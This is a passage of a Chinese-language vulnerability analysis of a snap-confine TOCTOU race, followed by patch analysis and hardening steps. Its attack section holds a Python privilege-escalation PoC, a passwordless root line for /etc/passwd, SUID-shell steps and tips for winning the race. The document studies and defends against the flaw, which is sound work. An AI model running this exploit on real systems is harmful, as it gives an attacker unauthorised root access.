+<span class="err">│</span><span class="w">      </span><span class="err">→</span><span class="w"> </span><span class="n">symlink</span><span class="p">(</span><span class="s2">&quot;/tmp/payload&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">)</span><span class="w">               </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────┘</span>
+<span class="w">                         </span><span class="err">▲</span>
+<span class="w">                         </span><span class="err">│</span><span class="w"> </span><span class="err">并发</span>
+<span class="w">                         </span><span class="err">▼</span>
+<span class="err">┌───────────────</span><span class="w"> </span><span class="err">攻击者线程</span><span class="w"> </span><span class="n">B</span><span class="err">（触发器）────────────────┐</span>
+<span class="err">│</span><span class="w">  </span><span class="err">循环执行</span><span class="p">:</span><span class="w">                                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="n">snap</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">&lt;</span><span class="n">pkg</span><span class="o">&gt;</span><span class="w">  </span><span class="p">(</span><span class="err">或触发自动更新的路径</span><span class="p">)</span><span class="w">             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="n">sleep</span><span class="w"> </span><span class="err">极短时间</span><span class="w">                                    </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<h3>4.3 提权链构造</h3>
+<p>成功完成 symlink 替换后，snap-confine 会以 root 权限操作攻击者控制的目录。可构造两条提权链：</p>
+<p><strong>链 A：覆盖 /etc/passwd</strong></p>
+<p>在 <code>/tmp/payload/etc/passwd</code> 中预置一行：</p>
+<div class="highlight"><pre><span></span><code>hacker::0:0:hacker:/root:/bin/bash
+</code></pre></div>
+
+<p>当 snap-confine 的 <code>sc_replicate_base_rootfs</code> 把系统 <code>/etc/passwd</code> 复制回写，或当 pivot_root 后该 passwd 生效，攻击者即可 <code>su hacker</code>（无密码）获得 uid=0。</p>
+<p><strong>链 B：植入 SUID shell</strong></p>
+<p>在 payload 目录中预置一个等待被赋予 SUID 的 shell 副本，利用 root 写入或后续 bind mount 的权限属性继承，使其带上 setuid 位：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 在 payload 中准备</span>
+cp<span class="w"> </span>/bin/bash<span class="w"> </span>/tmp/payload/.rootshell
+chmod<span class="w"> </span><span class="m">4755</span><span class="w"> </span>/tmp/payload/.rootshell<span class="w">   </span><span class="c1"># 期望被 root 写回时保留 SUID</span>
+</code></pre></div>
+
+<p>提权后：</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>/tmp/payload/.rootshell<span class="w"> </span>-p
+<span class="c1"># id</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+</code></pre></div>
+
+<h3>4.4 提权脚本框架</h3>
+<p>下面给出 PoC 概念脚本（Python，仅演示竞态逻辑，不保证在所有版本一击必中）：</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">PoC 概念演示（仅限受控环境）</span>
+<span class="sd">利用 snap-confine TOCTOU 竞态条件进行本地提权</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">threading</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">inotify.adapters</span>
+
+<span class="n">TARGET_DIR_PREFIX</span> <span class="o">=</span> <span class="s2">&quot;/tmp/snap.rootfs_&quot;</span>
+<span class="n">PAYLOAD_DIR</span> <span class="o">=</span> <span class="s2">&quot;/tmp/payload&quot;</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">prepare_payload</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;准备恶意文件系统结构&quot;&quot;&quot;</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">PAYLOAD_DIR</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">PAYLOAD_DIR</span><span class="si">}</span><span class="s2">/etc&quot;</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="c1"># 创建恶意 passwd 文件（添加 root 权限用户）</span>
+    <span class="n">malicious_passwd</span> <span class="o">=</span> <span class="s2">&quot;root:x:0:0:root:/root:/bin/bash</span><span class="se">\n</span><span class="s2">&quot;</span> \
+                       <span class="s2">&quot;hacker::0:0::/root:/bin/bash</span><span class="se">\n</span><span class="s2">&quot;</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">PAYLOAD_DIR</span><span class="si">}</span><span class="s2">/etc/passwd&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">malicious_passwd</span><span class="p">)</span>
+    <span class="c1"># 准备 SUID shell 副本（若权限允许则携带 setuid 位）</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&quot;cp&quot;</span><span class="p">,</span> <span class="s2">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">PAYLOAD_DIR</span><span class="si">}</span><span class="s2">/.rootshell&quot;</span><span class="p">],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">PAYLOAD_DIR</span><span class="si">}</span><span class="s2">/.rootshell&quot;</span><span class="p">,</span> <span class="mo">0o4755</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] SUID shell 准备失败: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">race_thread</span><span class="p">(</span><span class="n">stop_event</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;竞态条件利用线程&quot;&quot;&quot;</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="n">inotify</span><span class="o">.</span><span class="n">adapters</span><span class="o">.</span><span class="n">Inotify</span><span class="p">()</span>
+    <span class="n">i</span><span class="o">.</span><span class="n">add_watch</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">event</span> <span class="ow">in</span> <span class="n">i</span><span class="o">.</span><span class="n">event_gen</span><span class="p">(</span><span class="n">yield_nones</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout_s</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">stop_event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
+            <span class="k">break</span>
+        <span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="n">type_names</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span> <span class="o">=</span> <span class="n">event</span>
+        <span class="k">if</span> <span class="n">filename</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;snap.rootfs_&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&quot;IN_CREATE&quot;</span> <span class="ow">in</span> <span class="n">type_names</span><span class="p">:</span>
+            <span class="n">target</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+            <span class="c1"># 快速删除目录并替换为 symlink</span>
+            <span class="c1"># 注意：实际命中取决于目录属主与 sticky 规则</span>
+            <span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">os</span><span class="o">.</span><span class="n">rmdir</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+                    <span class="n">os</span><span class="o">.</span><span class="n">symlink</span><span class="p">(</span><span class="n">PAYLOAD_DIR</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
+                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Symlink 替换成功: </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+                    <span class="k">return</span> <span class="kc">True</span>
+                <span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
+                    <span class="k">continue</span>  <span class="c1"># 已被 snap-confine 处理，重试</span>
+                <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
+                    <span class="c1"># 目录非空或权限不足，极短重试</span>
+                    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.0005</span><span class="p">)</span>
+    <span class="k">return</span> <span class="kc">False</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">trigger_snap</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;触发 snap-confine 创建临时目录&quot;&quot;&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&quot;snap&quot;</span><span class="p">,</span> <span class="s2">&quot;run&quot;</span><span class="p">,</span> <span class="s2">&quot;some-snap-package&quot;</span><span class="p">],</span>
+                       <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
+        <span class="c1"># 回退：触发任何会调用 snap-confine 的路径</span>
+        <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&quot;snap&quot;</span><span class="p">,</span> <span class="s2">&quot;version&quot;</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">check_privesc</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;检测是否已提权成功&quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">PAYLOAD_DIR</span><span class="si">}</span><span class="s2">/.rootshell&quot;</span><span class="p">):</span>
+        <span class="n">st</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">stat</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">PAYLOAD_DIR</span><span class="si">}</span><span class="s2">/.rootshell&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">st</span><span class="o">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="mo">0o4000</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] 检测到 SUID shell，执行: /tmp/payload/.rootshell -p&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">True</span>
+    <span class="c1"># 尝试 su hacker</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&quot;su&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">,</span> <span class="s2">&quot;id&quot;</span><span class="p">,</span> <span class="s2">&quot;hacker&quot;</span><span class="p">],</span>
+                           <span class="nb">input</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;uid=0&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">stdout</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] passwd 覆盖成功，hacker 已为 root&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">True</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="k">return</span> <span class="kc">False</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">prepare_payload</span><span class="p">()</span>
+    <span class="n">stop_event</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
+    <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">race_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">stop_event</span><span class="p">,),</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="c1"># 多次尝试提高竞态命中率</span>
+    <span class="n">success</span> <span class="o">=</span> <span class="kc">False</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+        <span class="n">trigger_snap</span><span class="p">()</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">check_privesc</span><span class="p">():</span>
+            <span class="n">success</span> <span class="o">=</span> <span class="kc">True</span>
+            <span class="k">break</span>
+
+    <span class="n">stop_event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">success</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] 本轮未命中，建议增大循环次数或降低系统负载&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] 提权成功，清理痕迹并退出&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p><strong>复现要点与失败排查：</strong></p>
+<table>
+<thead>
+<tr>
+<th>现象</th>
+<th>原因</th>
+<th>对策</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>rmdir</code> 报 <code>Permission denied</code></td>
+<td>sticky bit + root 属主</td>
+<td>利用 snap-confine 自身回滚路径，或换用子路径竞争</td>
+</tr>
+<tr>
+<td>命中率极低</td>
+<td>窗口太短</td>
+<td>降低 CPU 频率调速器、增加并发触发线程</td>
+</tr>
+<tr>
+<td>symlink 创建后 snap 报错退出</td>
+<td>路径校验不通过</td>
+<td>检查 payload 目录结构是否完整匹配沙箱期望</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>5. 补丁分析</h2>
+<h3>5.1 补丁方案：使用 O_TMPFILE | O_EXCL 替代 mkdtemp</h3>
+<p>官方补丁的核心思想是<strong>用文件描述符取代路径名作为信任锚点</strong>。Linux 3.11+ 提供的 <code>O_TMPFILE</code> 标志可在指定目录下创建一个匿名、无目录项的临时文件/目录，再通过 <code>linkat()</code> 在需要时才赋予其一个名字。由于整个生命周期内攻击者无法通过路径名访问到该对象，TOCTOU 自然消解。</p>
+<p>补丁后的伪代码：</p>
+<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sc_bootstrap_mount_namespace</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">sc_mount_config</span><span class="w"> </span><span class="o">*</span><span class="n">config</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 使用 O_TMPFILE 创建匿名目录文件描述符，杜绝路径名竞争</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">dfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/tmp&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_TMPFILE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_DIRECTORY</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_CLOEXEC</span><span class="p">,</span><span class="w"> </span><span class="mo">0700</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dfd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">die</span><span class="p">(</span><span class="s">&quot;cannot create anonymous scratch directory&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 通过 *at 系列调用操作，所有后续操作均基于 dfd，不经过路径解析</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">proc_path</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="w">    </span><span class="n">snprintf</span><span class="p">(</span><span class="n">proc_path</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">proc_path</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;/proc/self/fd/%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">dfd</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// bind mount 基于 fd 对应的 /proc/self/fd/N 路径</span>
+<span class="w">    </span><span class="n">sc_do_mount</span><span class="p">(</span><span class="n">proc_path</span><span class="p">,</span><span class="w"> </span><span class="n">proc_path</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">MS_BIND</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="w">    </span><span class="n">sc_do_mount</span><span class="p">(</span><span class="s">&quot;none&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">proc_path</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">MS_UNBINDABLE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="w">    </span><span class="n">sc_do_mount</span><span class="p">(</span><span class="s">&quot;none&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">proc_path</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;tmpfs&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;uid=0,gid=0&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 在 fd 锁定的目录内复制根文件系统</span>
+<span class="w">    </span><span class="n">sc_replicate_base_rootfs_at</span><span class="p">(</span><span class="n">dfd</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+
+<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">dfd</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>关键改进对比：</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>旧实现（mkdtemp）</th>
+<th>新实现（O_TMPFILE）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>信任锚点</td>
+<td>路径名（字符串）</td>
+<td>文件描述符（内核对象引用）</td>
+</tr>
+<tr>
+<td>可竞争性</td>
+<td>路径可被 symlink 替换</td>
+<td>fd 指向固定 inode，无法被外部替换</td>
+</tr>
+<tr>
+<td>原子性</td>
+<td>创建与使用分离</td>
+<td>创建即持有引用，全程原子</td>
+</tr>
+<tr>
+<td>可见性</td>
+<td>在 /tmp 下有目录项</td>
+<td>匿名，无目录项</td>
+</tr>
+</tbody>
+</table>
+<h3>5.2 验证 mount 源与目标的设备号一致性</h3>
+<p>补丁还增加了二次校验：在执行 bind mount 前，通过 <code>fstat(dfd)</code> 与 <code>lstat(scratch_dir)</code> 比较 <code>st_dev</code>（设备号）与 <code>st_ino</code>（inode 号）。若二者不一致，说明路径已被替换，立即中止：</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">stat</span><span class="w"> </span><span class="n">fd_st</span><span class="p">,</span><span class="w"> </span><span class="n">path_st</span><span class="p">;</span>
+<span class="n">fstat</span><span class="p">(</span><span class="n">dfd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">fd_st</span><span class="p">);</span>
+<span class="n">lstat</span><span class="p">(</span><span class="n">scratch_dir</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">path_st</span><span class="p">);</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd_st</span><span class="p">.</span><span class="n">st_dev</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">path_st</span><span class="p">.</span><span class="n">st_dev</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">fd_st</span><span class="p">.</span><span class="n">st_ino</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">path_st</span><span class="p">.</span><span class="n">st_ino</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">die</span><span class="p">(</span><span class="s">&quot;scratch directory tampered (TOCTOU detected)&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>5.3 增加文件描述符锁防止竞态</h3>
+<p>进一步利用 <code>flock()</code> 或 <code>openat()</code> + <code>O_NOFOLLOW</code> 组合，确保即使在异常回滚路径中也不会出现可被替换的窗口：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// O_NOFOLLOW 防止跟随 symlink</span>
+<span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">openat</span><span class="p">(</span><span class="n">dir_fd</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_DIRECTORY</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_NOFOLLOW</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">O_CLOEXEC</span><span class="p">);</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">die</span><span class="p">(</span><span class="s">&quot;refused to follow symlink or non-existent path&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="c1">// flock 排他锁，防止并发删除/替换</span>
+<span class="n">flock</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">LOCK_EX</span><span class="p">);</span>
+</code></pre></div>
+
+<p>三道防线（O_TMPFILE 原子创建 + 设备号校验 + O_NOFOLLOW/flock）形成纵深，从机制上消除了 TOCTOU 的生存空间，而非依赖时序侥幸。</p>
+<hr />
+<h2>6. 防御方案</h2>
+<h3>6.1 临时缓解（无法立即打补丁时）</h3>
+<ol>
+<li><strong>移除 snap-confine 的 SUID 位</strong>（会影响 snap 应用启动）：</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="c1"># 临时缓解：移除 SUID 位，阻止普通用户触发</span>
+sudo<span class="w"> </span>chmod<span class="w"> </span>u-s<span class="w"> </span>/usr/lib/snapd/snap-confine
+<span class="c1"># 验证</span>
+ls<span class="w"> </span>-l<span class="w"> </span>/usr/lib/snapd/snap-confine
+<span class="c1"># -rwxr-xr-x ... （s 位已消失）</span>
+</code></pre></div>
+
+<p>注意：此举会导致所有 snap 应用无法正常启动，仅适用于可接受 snap 停服的关键主机。</p>
+<ol>
+<li><strong>限制 snap-confine 的执行用户</strong>：通过 AppArmor 或文件 ACL 仅允许特定用户组执行：</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="c1"># 仅允许 snap 组成员执行</span>
+sudo<span class="w"> </span>groupadd<span class="w"> </span>-f<span class="w"> </span>snapusers
+sudo<span class="w"> </span>chgrp<span class="w"> </span>snapusers<span class="w"> </span>/usr/lib/snapd/snap-confine
+sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">4750</span><span class="w"> </span>/usr/lib/snapd/snap-confine
+sudo<span class="w"> </span>usermod<span class="w"> </span>-aG<span class="w"> </span>snapusers<span class="w"> </span>&lt;trusted-user&gt;
+</code></pre></div>
+
+<ol>
+<li><strong>挂载 /tmp 加 <code>nosymfollow</code></strong>（内核 5.10+）或使用 <code>nodev,nosuid</code> 降低 symlink 攻击收益：</li>
+</ol>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>mount<span class="w"> </span>-o<span class="w"> </span>remount,nosymfollow<span class="w"> </span>/tmp
+</code></pre></div>
+
+<h3>6.2 补丁更新（首选）</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 更新 snapd 至修复版本</span>
+sudo<span class="w"> </span>apt<span class="w"> </span>update
+sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>--only-upgrade<span class="w"> </span>snapd
+<span class="c1"># 验证版本</span>
+snap<span class="w"> </span>version
+<span class="c1"># 确认 snap-confine 已为修复版（对照官方公告 CVE 对应版本号）</span>
+dpkg<span class="w"> </span>-l<span class="w"> </span>snapd
+</code></pre></div>
+
+<p>建议开启无人值守安全更新，确保 snapd 这类高价值 SUID 组件第一时间获得补丁：</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>unattended-upgrades
+sudo<span class="w"> </span>dpkg-reconfigure<span class="w"> </span>-plow<span class="w"> </span>unattended-upgrades
+</code></pre></div>
+
+<h3>6.3 纵深防御</h3>
+<p><strong>AppArmor 策略加固</strong></p>
+<p>为 snap-confine 编写更严格的 AppArmor profile，限制其对 <code>/tmp</code> 的写操作必须经由特定 helper，并禁止对任意路径的 bind mount：</p>
+<div class="highlight"><pre><span></span><code><span class="cp"># /etc/apparmor.d/usr.lib.snapd.snap-confine（节选）</span>
+<span class="n">profile</span><span class="w"> </span><span class="n">snap</span><span class="o">-</span><span class="n">confine</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">snap</span><span class="o">-</span><span class="n">confine</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;tunables/global&gt;</span>
+<span class="w">  </span><span class="n">capability</span><span class="w"> </span><span class="n">sys_admin</span><span class="p">,</span>
+<span class="w">  </span><span class="n">capability</span><span class="w"> </span><span class="n">chown</span><span class="p">,</span>
+<span class="w">  </span><span class="n">capability</span><span class="w"> </span><span class="n">setuid</span><span class="p">,</span>
+
+<span class="w">  </span><span class="cp"># 限制 /tmp 操作：仅允许匿名临时文件</span>
+<span class="w">  </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"> </span><span class="n">r</span><span class="p">,</span>
+<span class="w">  </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">snap</span><span class="p">.</span><span class="n">rootfs_</span><span class="o">*</span><span class="w"> </span><span class="n">mr</span><span class="p">,</span><span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="n">禁止</span><span class="w"> </span><span class="n">w</span><span class="err">（</span><span class="n">写入即创建具名目录</span><span class="err">）</span>
+<span class="w">  </span><span class="n">deny</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="cm">/** wl,          # 禁止在 /tmp 下写入链接</span>
+
+<span class="cm">  # mount 限制</span>
+<span class="cm">  mount -&gt; /tmp/snap.rootfs_*/</span><span class="p">,</span>
+<span class="w">  </span><span class="n">deny</span><span class="w"> </span><span class="n">mount</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="cm">/**,</span>
+<span class="cm">}</span>
+</code></pre></div>
+
+<p><strong>auditd 监控</strong></p>
+<p>监控 snap-confine 的异常执行与 <code>/tmp</code> 下的可疑 symlink 创建，作为检测与响应手段：</p>
